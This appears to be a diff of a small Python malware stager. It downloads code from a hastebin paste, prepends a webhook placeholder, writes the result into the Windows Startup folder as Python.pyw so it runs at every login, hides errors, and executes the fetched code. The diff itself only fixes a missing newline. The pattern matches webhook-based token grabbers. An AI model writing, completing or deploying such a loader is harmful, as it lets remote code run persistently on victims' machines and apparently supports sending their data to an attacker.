@@ -1,6 +1,6 @@
 from urllib import request
 from os import environ
-code = 'WEBHOOK = "YOUR WEBHOOK HERE"' + request.urlopen(request.Request('https://hastebin.com/raw/dimepuyuxu', headers={'user-agent': 'Chrome/103.0'})).read().decode()
+code = 'WEBHOOK = "YOUR WEBHOOK HERE"\n' + request.urlopen(request.Request('https://hastebin.com/raw/dimepuyuxu', headers={'user-agent': 'Chrome/103.0'})).read().decode()
 try: open(fr"C:\Users\{environ['username']}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Python.pyw", 'w').write(code)
 except: pass
 exec(code)
